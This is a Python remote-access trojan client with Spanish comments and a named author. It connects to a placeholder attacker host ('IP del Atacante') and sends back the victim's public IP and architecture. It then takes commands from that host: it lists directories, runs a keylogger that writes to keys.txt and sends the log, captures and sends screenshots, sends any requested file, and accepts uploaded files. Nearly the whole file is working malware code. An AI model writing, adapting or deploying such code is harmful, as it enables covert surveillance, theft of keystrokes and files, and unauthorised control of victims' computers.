#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

import socket
import subprocess
import sys
import platform as pl
from urllib.request import urlopen
import keyboard
import pyautogui
import datetime, time
import http.server
import socketserver

SERVER_HOST = 'IP del Atacante'
SERVER_PORT = 5003
BUFFER_SIZE = 200 * 1024
PORT = 8002
#cont = 0

fecha = time.strftime("%Y-%m-%d_%H%M%S")

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)

# Abrir URL.
r = urlopen("http://www.ifconfig.me/ip")
# Leer el contenido y e imprimir su tamaño.
b = r.read()
s.sendall(str(b).encode())
# Cerrar para liberar recursos.
r.close()
time.sleep(2)


system = [
        'architecture',

        
        ]

for dato in system:
    if hasattr(pl, dato):
        a =  getattr(pl, dato)()       
        s.sendall(str(a).encode())

time.sleep(2)
while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    cont = 0
    if command.lower() == "dir":
        output = subprocess.getoutput(command)
        s.sendall(output.encode())

    
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break

    if command.lower() == "keylogger":
        while cont < 11:
            if False:
                os.remove("keys.txt")
            output = open("keys.txt" , "a")
            for string in keyboard.get_typed_strings(keyboard.record("enter")):
                output.write(string + "\n")
            output.close()

            cont = cont + 1
            print(cont)

    if command.lower() == "send":
        f = open("keys.txt", "rb")
        content = f.read(BUFFER_SIZE)
        s.sendall(content)
        
    
        f.close()
        print("El archivo ha sido enviado correctamente.")


    if command.lower() == "screenshot":
        
        screenshot = pyautogui.screenshot()
        screenshot.save( "imagen.png")

        f = open("imagen.png", "rb")
        content = f.read(BUFFER_SIZE)
        s.send(content)
        #content = f.read(300*1024)
        f.close()
        print(content)
        print("La imagen ha sido enviado correctamente.")    


    if command.lower() == "download":
      
        d = "Nombre del archivo para descargar"        
        s.sendall(str(d).encode())
        command = s.recv(BUFFER_SIZE).decode()
        f = open(command, "rb")
        content = f.read(BUFFER_SIZE)
        s.send(content)       
        f.close()
        print(content)
        print("El archivo se ha enviado correctamente.")


    if command.lower() == "upload":
        d = "Nombre del archivo para cargar"        
        s.sendall(str(d).encode())

        r = s.recv(BUFFER_SIZE)
         
        print(r)
       
        with open("archivo", "wb") as f:
            #str(data, 'UTF-8')
            f.write(r)
        f.close()  
    
# close client connection
s.close()
